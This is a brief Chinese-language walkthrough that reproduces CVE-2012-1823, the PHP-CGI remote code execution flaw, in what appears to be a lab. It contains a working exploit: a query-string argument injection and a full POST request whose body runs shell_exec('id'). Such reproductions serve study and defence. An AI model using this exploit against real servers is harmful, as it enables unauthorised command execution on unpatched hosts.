# PHP-CGI远程代码执行漏洞（CVE-2012-1823）

**影响版本** （php < 5.3.12 or php < 5.4.2 ）+ apache

通过阅读源码，我发现cgi模式下有如下一些参数可用：

 - `-c` 指定php.ini文件的位置
 - `-n` 不要加载php.ini文件
 - `-d` 指定配置项
 - `-b` 启动fastcgi进程
 - `-s` 显示文件源码
 - `-T` 执行指定次该文件
 - `-h`和`-?` 显示帮助

## 漏洞判断

`-s`显示源码

![image-20211123112918753](https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211123112918753.png)

## 漏洞利用

```
index.php?-d allow_url_include=on -d auto_prepend_file=php://input
```

```
POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1
Host: 192.168.88.140:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

<?php echo shell_exec("id"); ?>
```

![image-20211123114007245](https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211123114007245.png)

> 注意，空格用`+`或`%20`代替，`=`用url编码代替。

